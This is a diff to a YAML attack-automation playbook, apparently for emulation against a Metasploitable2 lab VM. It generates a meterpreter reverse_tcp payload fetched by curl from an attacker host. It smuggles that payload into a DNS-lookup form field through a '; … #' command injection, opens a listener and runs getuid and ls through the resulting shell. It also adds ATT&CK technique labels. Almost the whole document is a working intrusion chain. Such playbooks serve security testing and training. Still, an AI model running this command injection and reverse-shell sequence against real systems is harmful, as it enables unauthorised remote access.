@@ -15,14 +15,16 @@
 #     3. Target a Metasploitable2-VM
 #
 vars:
-  METASPLOITABLE: 172.17.0.106
-  ATTACKER: 172.17.0.127
+  METASPLOITABLE: 192.168.0.146
+  ATTACKER: 192.168.0.29
   PAYLOAD: cmd/linux/http/x86/meterpreter/reverse_tcp
-  LPORT: 4401
+  LPORT: "4401"
 
 commands:
   - type: mktemp
     variable: RSHELL
+    metadata:
+      description: "Prepare directory for reverse shell"
 
   # generate a staged reverse shell
   # use a fetch-payload(curl) for the cmdstager
@@ -33,18 +35,24 @@ commands:
       LPORT: $LPORT
       FETCH_WRITABLE_DIR: /tmp
       FETCH_SRVHOST: $ATTACKER
-      FETCH_SRVPORT: 8080
+      FETCH_SRVPORT: "8080"
     format: raw
     local_path: ${RSHELL}
+    metadata:
+      description: "Preparing the shellcode for further attacks"
 
   # save payload in variable
   - type: shell
     cmd: cat $RSHELL
+    metadata:
+      description: "Print out payload"
 
   # prepare the command-injection-payload
   - type: setvar
     variable: CMDSTAGE
     cmd: "; $RESULT_STDOUT #"
+    metadata:
+      description: "Set variable CMDSTAGE"
 
   # start shell-listener in background
   - type: msf-module
@@ -56,9 +64,15 @@ commands:
       LPORT: $LPORT
       FETCH_WRITABLE_DIR: /tmp
       FETCH_SRVHOST: $ATTACKER
-      FETCH_SRVPORT: 8080
+      FETCH_SRVPORT: "8080"
     background: true
+      #exit_on_error: false
     kill_on_exit: true
+    metadata:
+      description: "Start local listener for reverse shell"
+
+  - type: sleep
+    seconds: 10
 
   # execute the command injection and trigger the reverse shell download
   - type: http-client
@@ -67,15 +81,29 @@ commands:
     data:
       target_host: $CMDSTAGE
       dns-lookup-php-submit-button: "Lookup+DNS"
-    background: true
-    kill_on_exit: true
+    background: false
+    exit_on_error: false
+    metadata:
+      techniques: "T1190,T1059.004,T1105"
+      tactics: "Initial Access,Execution,Command and Control"
+
+  - type: sleep
+    seconds: 10
 
   # execute a command via reverse shell
   - type: msf-session
     session: shell
     cmd: getuid
+    metadata:
+      description: "Verify shell access"
+      techniques: "T1033"
+      tactics: "Discovery"
 
   # execute a command via reverse shell
   - type: msf-session
     session: shell
     cmd: ls
+    metadata:
+      description: "List directory entries"
+      techniques: "T1083"
+      tactics: "Discovery"
